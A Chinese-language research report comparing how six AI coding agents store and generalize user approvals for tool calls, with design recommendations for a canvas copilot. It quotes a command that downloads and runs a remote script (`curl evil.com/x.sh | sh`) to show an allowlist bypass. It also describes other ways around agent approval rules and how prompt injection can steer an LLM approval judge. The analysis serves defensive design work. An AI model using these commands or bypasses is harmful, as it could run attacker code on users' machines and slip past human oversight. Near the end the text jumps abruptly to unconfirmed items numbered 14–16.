## 1. 主线

调研前立的主线是「分歧在于一次同意被记成了什么」。六份报告下来，这句成立但不够深。改写为：

> **六家都把「记住这次批准」实现成了「往一个字符串匹配器里追加一条规则」，没有一家把它实现成「记住一个决策」。** 这个共同选择带来一个共同后果：用户当时看到并同意的那件事（批准的语义），和未来会被放行的那一类事（存下来的规则），之间必然存在落差。六家的全部差异，是这个落差朝哪个方向偏、偏多少、以及用户看不看得见。

这句可证伪：只要找到一家把批准记成结构化决策对象（带有效期、带作用域、带原始上下文快照，匹配时做语义比对而非字符串比对），主线即被推翻。六家中无一如此。

落差有两个方向，两端都是失败模式：

- **偏宽**——存下来的规则覆盖范围大于用户看到的那次操作。OpenClaw 对 `git log` 点一次 allow-always，之后 `git push --force` 不再弹窗（`05` 切面 2）；Hermes 批一次「删 /tmp/x」，之后所有 `rm -r` 形态命令免批（`04` 切面 2）。
- **偏窄**——规则窄到几乎不复用，「记住」形同虚设。OpenClaw 推导不出可执行文件路径时退到整条命令 sha256，归一化只有 `.trim()`，多敲一个空格即缓存未命中（`05` 切面 5）；Codex 会话内缓存要求规范化后 argv 完全一致（`03` 切面 2）。

**没有一家提供「落差可见」作为通用机制** —— 用户在点「记住」的那一刻，普遍看不到自己实际授出去的范围有多大。两个局部例外见 §2 分歧点 5。

## 2. 分歧点矩阵

只列能追到不同前提假设的分歧。功能差异不进此表。

### 分歧点 1 —— 谁生成那个「类」

| 家 | 做法 | 背后的前提假设 |
|---|---|---|
| Claude Agent SDK | SDK 预先算好候选规则放进 `suggestions`，宿主只做选择题 | 系统比使用方更懂什么是安全的泛化 |
| Codex CLI | 系统提议一个命令前缀，写进选项文案让用户确认 | 同上，但把提议内容摊给用户看 |
| Claude Code CLI | 用户点「don't ask again」，CLI 按子命令拆分自动生成规则（单次最多落 5 条） | 同上 |
| OpenClaw | 系统只捕获已解析的绝对二进制路径，**不合成任何通配符**；想要 glob 必须用户手写或改配置 | 用户有能力也有意愿写规则；系统不该替用户扩大范围 |
| Hermes Agent | 「类」是约 30 条硬编码正则的 description，用户只能选生效范围，不能定义类 | 危险操作的类别是可穷举的 |
| Pi | 不提供 | 这不是框架该管的事 |

**代价**：系统提议路线把归纳算法的宽严做成黑盒，使用方承担后果却没有话语权（`02` 切面 2 明确点出这一点）。用户手写路线把规则语法的学习成本转嫁给用户，而 OpenClaw 的手写 glob 编译器在非 Windows 上不做大小写与符号链接归一化（`05` 切面 5），写错了不会报错，只会静默不匹配。硬编码枚举路线的滞后性由 Hermes 自己的源码注释承认——`kill -9 $(pgrep -f hermes)` 这类命令替换构造对正则不透明，团队的应对是逐案例追加正则补丁（`04` 切面 5）。

### 分歧点 2 —— 落差朝哪偏

```
     偏窄(复用率低)  <---------------------------------->  偏宽(误批敞口大)
                                                                
  OpenClaw          Codex             Claude Code        Codex           Hermes         OpenClaw
  sha256 兜底       会话内            Bash 规则          prefix_rule     类别           allow-always
  (整条命令哈希)     精确签名          (子命令拆分)        (前缀 token)    (约30条正则)    (路径, 参数不限)
```

**前提假设的分歧**：偏窄一端假设误批的代价高于审批疲劳的代价；偏宽一端假设反之。这个假设没有一家在文档里明说，全部体现在默认值里。OpenClaw 把两端同时做进了同一个机制——主路径偏宽（路径匹配、参数不受限），兜底路径偏窄（整条命令哈希）——因此它同时承担两种失败模式（`05` 切面 5）。

### 分歧点 3 —— 「信任域」是不是权限

Codex 与 Pi 都有目录级信任，但两家都**明确把它排除在执行审批之外**：

- Codex `trust_level` 只决定该项目自己的 `.codex/config.toml`、hooks、exec policy 规则文件要不要被加载。审批执行路径（`core/src` 排除 config 目录）全仓库搜不到任何读取 `trust_level` 的代码（`03`「信任域与逐次审批的关系」）。标 trusted 后逐次审批照常发生。
- Pi 的 project trust 决定要不要加载 `.pi/settings.json`、扩展、技能、系统提示。官方文档明文「不是沙箱，不限制模型能让工具做什么」（`06` 定位）。

其余四家没有信任域这个概念。

**前提假设**：把「这个目录的内容可信」和「这个目录里的操作可放行」拆开，前提是主要威胁模型为 prompt injection（内容投毒），而非用户误操作。若威胁模型是后者，这一层拆分不产生价值，只产生心智负担。

**代价**：两家都因此产生同一个用户预期错位。Codex 报告直接把它写成典型的「用户预期 vs 实现」错位——「我明明信任了这个项目为什么还一直问我」（`03`）。

### 分歧点 4 —— fail-safe 朝哪边倒

这一列的分歧最大，而且多数不是设计选择的结果，是历史包袱或疏忽。

| 家 | 无人值守时的行为 | 性质 |
|---|---|---|
| Hermes Agent | 既非交互 CLI / 网关 / ask / cron 的调用，**直接放行，连危险命令正则检测都不跑**，只剩硬编码 hardline 兜底 | fail-**open**。源码注释自称「preserve the existing non-interactive behavior」，是既有设计不是疏漏（`04` 切面 8） |
| OpenClaw | 零配置默认 `security=full, ask=off, askFallback=full` | fail-**open**。文档自己写「YOLO is the default host behavior unless you tighten it explicitly」，但文档示例配置写的是 `security:"deny"`，容易读反（`05` 切面 8） |
| Claude Agent SDK | `canUseTool` 回调**没有超时**，宿主不返回则工具调用永久挂起 | 既不倒向拒绝也不倒向放行。类型定义原文：「an accidental null means no control_response is sent and the tool stays blocked indefinitely — permission prompts have no park deadline」（`02` 切面 8） |
| Claude Code CLI | Manual 模式 fail-closed；一旦用户选 `bypassPermissions` 则整体转 fail-open（除少数硬底线） | 分层，由用户显式选择切换 |
| Codex CLI | `codex exec` 默认 `approval_policy=Never`（不等人），但 `sandbox_mode` 照常解析生效 | 「不打扰但仍受沙箱约束」，第三个方向 |
| Pi | 框架两处 fail-closed（trust 无 UI 时拒绝、hook 抛异常时拒绝），但**不覆盖扩展的业务判断** | 框架 fail-closed，策略层无保证（`06`） |

**这一列的教训不在于哪个方向对，而在于三家的 fail-safe 方向和它们各自宣称的安全姿态不一致**，且不一致处都在无人值守路径上——这正是最没人盯着的地方。

### 分歧点 5 —— 落差是否可见

只有两家做了机制，其余四家没有：

- **Claude Code CLI**：当命令或编辑内容太大、选项文案无法完整展示规则将覆盖的范围时，**撤掉「don't ask again」选项**，只留一次性批准（`01` 切面 3）。这是六家里唯一把「看不全就不让你永久批」做成硬机制的。
- **Codex CLI**：把泛化范围写进选项文案本身——`Yes, and don't ask again for commands that start with '<prefix>'`（`03` 切面 7）。

反向的极端也在 OpenClaw：对 python/node/ruby 等解释器点「allow always」，在 `strictInlineEval` 默认关闭时**根本不落盘**，且没有任何用户可见的解释——用户被静默地反复要求重新批准（`05` 切面 5）。

### 分歧点 6 —— 撤销与批准是否对称（负向共识）

**六家全部不对称，无一例外。** 这不是分歧，是六家共同的空白，因此比任何分歧都值得记：

| 家 | 批准粒度 | 撤销手段 |
|---|---|---|
| Claude Code CLI | 规则字符串，四层 settings 合并 | `/permissions` 删规则；无「这条规则历史上放行过什么」的回溯（`01` 切面 6） |
| Claude Agent SDK | 五种 destination | `session` 目的地**没有任何撤销 API**，只能结束 `query()`（`02` 切面 6） |
| Codex CLI | 单次 / 会话 / 前缀类 / host / 整项目，五档 | 只有「整项目 trust_level 改回 untrusted」；`.rules` 里的单条规则无删除命令，手工编辑文本文件（`03` 切面 6） |
| Hermes Agent | once / session / always | `command_allowlist` 全仓库只有写入和读取两处，**没有任何 remove 函数**；改完还要重启进程才生效（`04` 切面 6） |
| OpenClaw | `(pattern, argPattern)` 可组合出多条独立记录 | CLI `remove <pattern>` 只按 pattern 过滤，**会连带删掉所有共享该 pattern 的不同 argPattern 授权**（`05` 切面 6） |
| Pi | 目录路径（框架层）/ 扩展自定义 | 框架层对称；扩展层无任何统一撤销通道（`06` 切面 6） |

### 分歧点 7 —— 审计（负向共识）

同样是六家共同的空白：

- Hermes：危险命令审批默认**无持久化审计日志**；钩子存在但内置插件无一订阅。同一系统里 skill 安装反而有 `audit.log`——两套子系统的可审计性完全不对等（`04` 切面 6）。
- OpenClaw：已解决的审批记录 15 秒后从内存清除；持久化的 allowlist 条目类型里**根本没有 `resolvedBy` 字段**，一次批准变成永久授权后，「是谁批的」不会被保留（`05` 切面 6）。
- Claude Code：`/permissions` 只展示当前规则清单，没有「某条 allow 规则历史上放行过哪些具体调用」的回溯（`01` 切面 6）。
- Codex：代码里有审批决策埋点（`session_telemetry.tool_decision`），但去向是 OTel/analytics 管道，是否落到本地可查询文件未确认（`03` 切面 6）。
- Agent SDK：唯一查询能力 `resolveSettings()` 标注 `@alpha`，且不含会话内动态授权（`02` 切面 6）。
- Pi：`trust.json` 只存最终状态快照，无时间戳无历史（`06` 切面 6）。

## 3. 决策单元 × 生命周期定位图

纵轴是「一次同意作用于什么」，横轴是「它活多久」。

```
                |  单次      |  会话              |  项目/仓库        |  全局永久
  --------------+-----------+-------------------+------------------+---------------------
  一次调用       |  六家默认  |  Codex            |  (空)            |  (空)
  (精确签名)     |           |  ApprovalCacheKey  |                  |
  --------------+-----------+-------------------+------------------+---------------------
  资源前缀       |           |  Claude Code      |  Claude Code     |  Claude Code
  (路径/域名)    |           |  Edit/Write 批准   |  Read/Edit 规则   |  user 层规则
                |           |                   |  OpenClaw 路径条目 |  Codex network rule
  --------------+-----------+-------------------+------------------+---------------------
  命令模式       |           |  ((空缺))         |  Claude Code     |  Codex prefix_rule
  (用户/系统生成) |           |                   |  Bash 仓库级规则  |  OpenClaw argPattern
  --------------+-----------+-------------------+------------------+---------------------
  类别           |           |  Hermes session   |  (空)            |  Hermes always
  (硬编码枚举)   |           |                   |                  |
  --------------+-----------+-------------------+------------------+---------------------
  工具           |           |  Agent SDK        |  Agent SDK       |  Agent SDK
                |           |  session dest      |  projectSettings |  userSettings
  --------------+-----------+-------------------+------------------+---------------------
  信任域         |           |  Pi session-only  |  Codex trust     |  (空)
  (目录/项目)    |           |  trust            |  Pi trust.json    |
```

四个空格子里，三个不重要（「一次调用 × 全局永久」没人做是合理的；「信任域 × 全局永久」等价于关掉审批；「类别 × 项目」只有 Hermes 一家有类别概念）。

**第四个空格子是本次调研最有价值的发现**：

> **「用户或系统当场生成的命令模式」× 「会话级」这一格，六家全空。**

凡是当场生成的模式，六家都直接落到项目级或全局永久；凡是会话级的记忆，要么是精确签名（Codex，几乎不复用），要么是硬编码类别（Hermes，用户无从定义）。**「这个会话内，这一类操作别再问我」这个中间档，六家一个都没有。**

**技术判断**：这个空缺大概率不是因为它没价值，而是因为实现路径不同——会话级需要一份内存态的、可动态增长的规则集，而六家的规则匹配引擎全部是为「读配置文件」设计的（Claude Code 读 settings.json、Codex 读 .rules、OpenClaw 读 exec-approvals.json、Hermes 读 config.yaml）。把当场生成的规则塞进这套引擎，最省事的做法就是直接写盘，于是会话级被跳过了。这是推断，六家均无文档说明。

**产品判断**（依据只到代码为止，未考虑定价、用户分层、竞品）：这一格是审批疲劳与误批敞口之间唯一没被占据的中间地带。会话级模式记忆的误批敞口天然被会话时长封顶，不需要撤销机制兜底——这恰好绕开了 §2 分歧点 6 那个六家全错的坑。

## 4. 泛化机制谱系

### 4.1 档位分布

```
 档0 不泛化      Pi 框架层(不提供)
 档1 精确匹配    Codex 会话内缓存(规范化 argv+cwd+sandbox) | OpenClaw sha256 兜底
 档2 前缀/glob   OpenClaw 手写 allowlist(*/**/? 手写编译器) | Claude Code Read/Edit(gitignore 语法)
                Codex prefix_rule(token 数组) | Pi project trust(目录 nearest-ancestor)
 档3 结构化      Claude Code Bash(复合命令拆分+壳层剥离+词边界) | OpenClaw argPattern(argv[1:] 正则)
 档4 规则 DSL    Claude Code / Agent SDK settings.json(deny>ask>allow 跨层合并)
                OpenClaw safe-bin 语义表(按 bin 名硬编码规则)
 档5 模型判定    Claude Code auto classifier | Codex Guardian | Hermes smart 模式
```

多数家在多档混用。**档 5 有三家，超出调研前的预期**，且三家做法有实质差异，见 4.3。

### 4.2 归一化对照——安全洞集中在这里

| 家 | 复合命令拆分 | 壳层剥离 | 大小写归一 | 符号链接归一 |
|---|---|---|---|---|
| Claude Code CLI | 识别 7 种分隔符逐段独立匹配 | 内置固定表（`timeout`/`nice`/`nohup`/`stdbuf` 等），**不可配置且不含 `devbox run`/`npx`/`docker exec`** | Windows 上路径转 POSIX | allow 规则要求链接与目标双匹配；deny 单边匹配即拦 |
| Codex CLI | **不拆**，复合脚本整体当一段文本 | 只归一 `bash -lc` vs `/bin/bash -lc` 外壳 | Windows 小写 | trust 查找保留字面与 canonical 双 key；规则引擎侧未查 |
| OpenClaw | 拆 `&&`/`\|\|`/`;` 链再拆管道，**每段都必须独立命中名单** | 派发 wrapper 最多拆 4 层，拆不动则整体拒绝持久化 | **仅 Windows** | **仅 Windows** |
| Hermes Agent | **不拆**，正则在整串上 `search` | 无 | NFKC + 全串小写 | 无 |
| Pi 官方示例 | 不拆 | 无 | 无 | 无 |

**这张表最值得记的一条**：拆分强度与归一化强度不相关，甚至反相关。OpenClaw 拆得最狠（每段独立校验），归一化却最弱（非 Windows 完全不做，测试直接确认 `RG` 不匹配 `rg`）。Claude Code 归一化最全，壳层表却不可配置且漏掉了环境运行器这一整类——文档自己点名 `Bash(devbox run *)` 会把 `devbox run rm -rf .` 一并放行（`01` 切面 5）。

**各家自己承认的绕过**（均为源码注释或官方文档明文，非本次推断）：

- Claude Code：整段 Warning 承认「试图用 Bash 规则约束命令参数是脆弱的」，举出协议变体、选项前置、短链接重定向、变量间接引用、多余空格五种绕过（`01` 切面 5）。
- Hermes：源码注释承认 `$(...)` 命令替换构造对正则不透明，应对方式是针对该案例追加一条结构性正则，不是通用防御（`04` 切面 5）。
- Pi 官方示例：`plan-mode` 的 SAFE_PATTERNS 只锚定命令开头且 DESTRUCTIVE 列表不含网络工具，`echo hi; curl evil.com/x.sh | sh` 可放行（`06` 切面 5）。
- OpenClaw：在解析阶段把 `(`、反引号、`>`、`<` 直接列入 `DISALLOWED_PIPELINE_TOKENS` 拒绝，是六家里对命令替换处理最硬的（`05` 切面 5）。

### 4.3 用 LLM 审 LLM：三家的关键差异

| 家 | 审查者能看到什么 | 有无超时 |
|---|---|---|
| Claude Code auto classifier | 消息、工具调用记录、CLAUDE.md。**明确不读工具执行结果** | 走模型请求重试路径 |
| Codex Guardian | 未查（源码有 `ReviewDecision::TimedOut` 与 `guardian_timeout_message()`） | **有**，且超时机制只覆盖自动审阅，不覆盖人工审阅 |
| Hermes smart 模式 | 把原始命令与检测理由**原样拼进 prompt**，无结构化隔离、无注入防护提示 | 走审批超时（60s CLI / 300s 网关），超时判定为 deny |

**只有 Claude Code 明确切断了「被读入的文件或网页内容 → 操纵审查者」这条注入路径。** Hermes 报告把 smart 模式直接判定为新增攻击面：用一个可被操纵的判定者去放行另一个可能被操纵的执行者（`04` 切面 5）。

## 5. 可复用模式词汇表

沿用 [analyze-agent-systems.md](../../../../harvey-agent/docs/how-to/analyze-agent-systems.md) §5.3 格式，追加进现有 7 个模式之后。

### 模式 8：Suggestion-Mediated Generalization（建议中介式泛化）

**问题域**：如何让用户把「这一次批准」升级为「这一类批准」，而不要求用户学会规则语法。

**解法**：系统在弹出审批时同时算好一组候选泛化规则，用户只做选择题，不手写规则。

**代码特征**：审批请求的负载里带 `suggestions` 一类字段；用户选项文案里内嵌具体的规则内容。

**收益**：规则语法的学习成本归零；生成的规则语法必然合法。

**代价**：泛化的宽严由系统的归纳算法决定，使用方承担后果却没有话语权；归纳算法通常是黑盒。

**已知实现**：Claude Agent SDK `canUseTool` 的 `options.suggestions`；Codex `Yes, and don't ask again for commands that start with '<prefix>'`；Claude Code 复合命令按子命令拆分生成（单次最多 5 条）。

**标签**：`#approval` `#generalization` `#ux`

### 模式 9：Disclosure-Gated Persistence（可见性门控的持久化）

**问题域**：如何防止用户永久批准了自己没看全的东西。

**解法**：只有当审批提示能完整展示规则将覆盖的范围时，才提供「永久批准」选项；展示不全则该选项消失，只留一次性批准。

**代码特征**：选项集合是根据待审批内容的体积/可展示性动态计算的，不是固定常量。

**收益**：把「批准的语义」与「存下来的规则」的落差压到用户实际看见的范围内。

**代价**：大 diff、长命令场景下用户永远只能一次性批，这些场景的审批疲劳无解——而它们往往正是重复度最高的场景。

**已知实现**：Claude Code CLI（`01` 切面 3）。六家中仅此一例。

**标签**：`#approval` `#ux` `#safety`

### 模式 10：Trust-as-Loading-Gate（信任只门加载，不门执行）

**问题域**：目录级信任应该控制什么。

**解法**：目录信任只决定「要不要加载该目录下的配置、扩展、规则、系统提示」，不决定「该目录下的操作要不要审批」。两条链路在代码上完全不相交。

**代码特征**：审批执行路径里搜不到任何读取信任状态的代码。

**收益**：把「内容投毒」与「误操作」两个威胁模型分开处理，各自用合适的机制。

**代价**：用户几乎必然把「信任这个目录」误读成「这个目录不再打扰我」。Codex 报告把它记为典型的用户预期错位，会被当作 bug 反馈。

**已知实现**：Codex CLI `trust_level`；Pi project trust。

**标签**：`#trust` `#threat-model` `#mental-model`

### 模式 11：Sanitize-and-Rebind Forwarding（转发前剥离与重绑定）

**问题域**：审批结果跨进程转发时，如何防止「批准 A 命令、换成 B 命令执行」。

**解法**：转发前剥离调用方自带的一切批准字段，只有当能匹配到一条真实、未过期、且绑定同一组身份字段（argv、cwd、agentId、sessionKey、env-hash、连接）的原始审批记录时，才重新写回批准标记。

**代码特征**：存在一个专门的 sanitize 函数横在转发路径上，且它显式列举被绑定的字段。

**收益**：堵住混淆代理漏洞——低权限调用方无法通过往转发参数里塞控制字段来绕过审批。

**代价**：每新增一个可转发字段都要同步维护绑定校验，字段增减时容易漏；且下游最终仍然只能相信上游转发的标记是合法的，不做二次人身份验证。

**已知实现**：OpenClaw `sanitizeSystemRunParamsForForwarding`（`05` 切面 1）。

**标签**：`#approval` `#confused-deputy` `#ipc`

### 模式 12：Result-Blind Classifier（结果盲审查器）

**问题域**：用模型做审批复核时，如何不让被审查的内容操纵审查者。

**解法**：审查模型只喂消息、工具调用记录和项目指令，**不喂工具执行结果**。

**代码特征**：审查者的上下文构造函数显式排除了工具结果这一类输入。

**收益**：切断「被读入的文件或网页内容 → 操纵审查者」这条注入路径。

**代价**：审查者看不到执行结果，对「上一步失败了所以这一步需要提权」这类上下文无感，会误判为无理由的提权。

**已知实现**：Claude Code auto 模式 classifier。**反例**：Hermes smart 模式把原始命令与检测理由原样拼进 prompt，无隔离（`04` 切面 5）。

**标签**：`#llm-as-judge` `#prompt-injection` `#approval`

### 模式 13：Segment-Wise Allowlisting（逐段白名单）

**问题域**：复合命令如何防止「安全前缀夹带危险后缀」。

**解法**：按 `&&`/`||`/`;` 拆链，链内再按 `|` 拆管道，要求**每一段**都独立命中白名单才整体放行。

**代码特征**：匹配逻辑是 `segments.every(...)` 而不是对整串做一次匹配。

**收益**：`safe && evil` 不能借前半段过关；这是对 Pi 官方示例那种「只锚定命令开头」缺陷的直接修正。

**代价**：正常的复合命令要求每一段都被批准过，日常摩擦上升；且拆分本身依赖对 shell 语法的正确解析，遇到解析不了的构造只能整体拒绝。

**已知实现**：OpenClaw `evaluateSegments`；Claude Code（拆分后规则对每个子命令独立匹配）。

**标签**：`#allowlist` `#shell` `#bypass-prevention`

## 6. 对目标系统的启示

目标系统：Canvas Pilot（agent-canvas 的画布级 copilot，宿主进程内嵌、程序化事件流驱动、跨重启常驻）。以下现状均为 2026-08-19 读 `agent-canvas` @ `cf7ff43` 得到，仅用于对位，未参与前五章的框架制定。

### 6.1 现状对位

```
  pilot 当前落点（对照 §3 定位图）

                |  单次      |  会话   |  项目   |  全局永久
  --------------+-----------+--------+--------+----------
  工具           |  << 这里 >> |        |        |
```

- 拦截点：pi 的 `tool_call` hook，两级串联（`src/main/pilot/pilotToolCallHook.ts`）。第一级 `DESTRUCTIVE_TOOL_NAMES` 无条件审批，共 11 个工具：`purge_node`、`unlink_nodes`、`bash`、`write`、`edit`、四个 `hskill_*`、两个 `*_agent_profile`。第二级是 opt-in 的路径白名单（`allowedDirectories` 未配置时整体 no-op）。
- 决策单元：**工具名**。生命周期：**单次**。
- `requestApproval` 的返回类型是 `Promise<boolean>`——**结构上不存在任何表达「记住」的通道**。
- fail-safe：`PilotBridge` 里 `let approved = false`，未配置回调或回调抛异常都落到 `false`。fail-closed。
- `pilotPathGuard.ts:50` 注释明确写着不要尝试命令字符串解析，`bash` 走无条件审批。

**技术判断**：pilot 是六家加上它自己共七个系统里，唯一决策单元停在「工具」级、生命周期停在「单次」的。它的重复审批率结构性地高于所有六家——连 Hermes 的「类别 × 会话」都没有。

**一条需要纠正的直觉**：Pi 框架没有跨会话的扩展状态存储（`pi.appendEntry` 是 session-scoped，`06` 切面 4），但这**不构成 pilot 的能力上限**。pilot 的审批不在 Pi 扩展里做完——扩展只负责发起，实际决策通过 host 到 renderer 的往返完成，宿主是 Electron 主进程，有完整文件系统。Pi 的薄只约束「纯 Pi 扩展」形态的实现，不约束 pilot。

### 6.2 可直接采用

**A. 保持 fail-closed 不变。** 六家里 Hermes 与 OpenClaw 都是 fail-open，且都被各自报告点名为问题（Hermes 的静默放行分支连检测都不跑；OpenClaw 的默认配置与文档示例相反）。pilot 现在的 `approved = false` 默认是对的。代价：无——这一条不需要付出任何东西，只需要不动它。

**B. Disclosure-Gated Persistence（模式 9）。** pilot 的画布工具参数是结构化的（node id、relation、profile 字段），完整展示的成本远低于 shell 命令或大 diff，因此几乎总能满足「展示得全」这个条件。Claude Code 采用这条的代价（大内容场景下永久批准选项消失）在 pilot 上基本不发生。

**C. Result-Blind Classifier 的否定形式。** 不引入模型判定即自动满足。见 6.4。

### 6.3 需改造后采用

**D. 决策单元从「工具名」细化到「工具名 + 参数签名」，但只对结构化工具。**

pilot 相对六家有一个结构性优势：**它没有 shell**。§4.2 那张归一化对照表里的全部复杂度——复合命令拆分、壳层剥离、符号链接、shell 展开、命令替换——在 pilot 的 10 个结构化工具上根本不存在。它们的参数是 JSON 对象，不是待解析的字符串。

**推论**：把 `bash` 和其余 10 个工具分开设计。

- 结构化工具走参数级泛化。落差可控，因为参数字段是有限且已知的（`CANVAS_TOOL_SPECS` 是自己定义的）。
- `bash` 继续走无条件逐次审批。这与 `pilotPathGuard.ts:50` 已经写下的判断一致，也与六家的教训一致——五家在 shell 命令泛化上的安全洞，全部来自试图对命令字符串做匹配。

改造点：不要照抄 OpenClaw 的「路径匹配、参数不限」。那是它在 shell 场景下被迫做的妥协，pilot 没有这个约束，可以直接对参数做结构化比对。

**代价**：参数签名的设计要回答「哪些字段进签名、哪些不进」。举例：`purge_node(nodeId)` 的 nodeId 进签名，则批准只覆盖这一个节点；不进签名，则批准覆盖所有节点。这个选择必须逐工具做，不能有统一答案——这是十次判断，不是一次。

**E. 补上 §3 定位图里那个六家全空的格子：会话级模式记忆。**

「本 thread 内，这一类操作别再问」。pilot 比六家更容易做这一档，因为它本来就有明确的 thread 概念（`pilotThreadController`、`pilotThreadStore`），会话边界是现成的。

**代价**：需要一份内存态、可动态增长的规则集，与「读配置文件」式的静态规则引擎是两套东西。§3 的推断认为六家跳过这一档正是因为这个实现成本。

**产品判断**（依据只到代码为止，未考虑定价、用户分层、竞品）：会话级的误批敞口天然被会话时长封顶，因此不需要撤销机制兜底——这恰好绕开 §2 分歧点 6 那个六家全错的坑。如果只做一档「记住」，做会话级比做永久级的风险收益比更好。

**F. Suggestion-Mediated Generalization（模式 8）。** pilot 的工具由自己定义，系统提议候选规则比让用户手写规则语法现实得多。但要带上模式 9 的门控：提议内容必须写进选项文案本身（Codex 的做法），不能像 Agent SDK 那样让归纳算法完全黑盒。

### 6.4 应避免

**G. 不要做 Trust-as-Loading-Gate 式的「信任这个画布/项目」。** Codex 与 Pi 都记录了同一个心智错位。pilot 的用户是同一个人在自己的项目里工作，没有「内容投毒」这个威胁模型驱动这层拆分——引入它只会产生 Codex 那个「我明明信任了为什么还问」的问题，拿不到对应的收益。

**H. 不要引入模型判定（档 5）。** 三家做了，只有 Claude Code 做对了注入隔离，Hermes 明确做错。pilot 的工具集小（11 个）且结构化，规则匹配足够覆盖，引入模型判定是拿不确定性换本来就不存在的复杂度。

**I. 不要让撤销粒度粗于批准粒度。** 六家无一例外都犯了这个错，这是全部调研里唯一一条「六家全错」。代价在于：撤销必须从一开始就设计进存储 schema，事后补齐要重构。OpenClaw 是最具体的教训——它的批准可以生成 `(pattern, argPattern)` 多条独立记录，撤销却只按 pattern 过滤，删一条会连带删掉所有共享该 pattern 的授权。

**J. 不要把审计留到以后。** 同样是六家共同的空白。OpenClaw 最具体：永久授权条目的类型里根本没有 `resolvedBy` 字段，「是谁批的」在批准变成永久授权的那一刻就丢了。这类字段一旦缺失，历史数据无法追溯补齐。

### 6.5 Feature Card

#### FC-01：审批决策单元细化为「工具名 + 参数签名」（仅结构化工具）

**来源**：从 OpenClaw「路径匹配、参数不限」的失败与 Codex「精确签名」的低复用率对照中提炼
**优先级**：P0
**类型**：架构改造

**用户问题**：当前每次调用 11 个受控工具中的任何一个都要点一次，即使是对同一个节点的重复操作。

**设计方案**：为 10 个结构化工具各自定义参数签名（哪些字段进签名）。`bash` 不纳入，继续无条件逐次审批。`requestApproval` 的返回类型从 `Promise<boolean>` 改为携带决策范围的对象。

**成功指标**：同一 thread 内对同一节点的重复破坏性操作，审批次数从 N 降到 1。

**风险与依赖**：签名字段的选择要逐工具做；依赖 FC-02 的存储层。

**参考实现**：`03` 切面 2（Codex `ApprovalCacheKey` 的分工具签名设计，含 apply_patch 按文件路径拆开的做法）

#### FC-02：会话级「本 thread 内不再问」档位

**来源**：§3 定位图中六家全空的格子
**优先级**：P0
**类型**：新功能

**用户问题**：目前只有「批准」和「拒绝」，没有任何中间档；而永久档的误批敞口需要撤销机制兜底，成本高。

**设计方案**：审批选项增加第三项，作用域绑定当前 thread，随 thread 结束失效。规则集内存态，不落盘。

**成功指标**：不引入任何持久化存储的前提下，重复审批率下降。

**风险与依赖**：thread 生命周期的定义要与 `pilotThreadStore` 对齐；跨重启 resume 时该档位应失效（与 Agent SDK 的 `session` destination 语义一致）。

**参考实现**：`02` 切面 3（`PermissionUpdateDestination` 的 `session` 档语义与它没有撤销 API 的代价）

#### FC-03：系统提议规则 + 提议内容写进选项文案

**来源**：模式 8 + 模式 9 的组合
**优先级**：P1
**类型**：新功能

**用户问题**：用户不该为了少点几次而去学一套规则语法。

**设计方案**：审批弹窗由系统算出候选泛化规则，选项文案里内嵌该规则的人类可读描述（Codex 做法）。当规则覆盖范围无法在文案里完整展示时，撤掉该选项（Claude Code 做法）。

**成功指标**：用户在选择「记住」时，选项文案已经说清了将被放行的范围。

**风险与依赖**：依赖 FC-01 的参数签名设计。

**参考实现**：`03` 切面 7（选项文案原文）；`01` 切面 3（展示不全则撤掉选项的机制）

#### FC-04：审批清单与对称撤销

**来源**：§2 分歧点 6 与 7，六家共同的空白
**优先级**：P1（但存储 schema 必须在 FC-01 落地时就预留）
**类型**：新功能

**用户问题**：批准之后无法查看自己批过什么，也无法按批准时的粒度收回。

**设计方案**：审批记录带 `grantedAt`、`scope`、`toolName`、`signature` 字段；撤销入口按同一粒度操作。即使 UI 后做，字段必须在第一版存储里就有。

**成功指标**：任意一条已生效的授权，都能被单独撤销而不影响其他授权。

**风险与依赖**：OpenClaw 的教训表明这类字段事后补不回来（历史数据无法追溯）。

**参考实现**：`05` 切面 6（`ExecAllowlistEntry` 类型缺 `resolvedBy` 字段的具体后果）

14. Agent SDK 的 `sandbox.*` 在 SDK 会话中的生效范围未确认（`02` 未确认项 2）。
15. Codex shell 命令是否有与 `assess_patch_safety` 对等的沙箱内自动放行逻辑未查（`03` 未确认项 2）。
16. Pi 的 `appendEntry` JSONL schema 与并发写入加锁行为未核实（`06` 未确认项 3）。

### 调研过程中被推翻的预判

调研规格 §4 与 §10 里写下的三条预判，两条被推翻：

- **「Hermes 的 trust_level 是权限主干，需查清它与逐次审批是替代还是并存」** —— 推翻。两者毫无关联，trust_level 只用于 skill 安装扫描（`04` 定位）。
- **「OpenClaw 的 `exec-allowlist-pattern.ts` 暗示有成熟的模式泛化实现」** —— 部分推翻。glob 编译器确实存在，但 allow-always 不自动合成 glob，只捕获精确路径；泛化不是从用户的一次批准里学出来的（`05` 切面 5）。
- **「Pi 的权限很薄，权限主要由使用方在扩展层实现」** —— 证实（`06` 定位）。
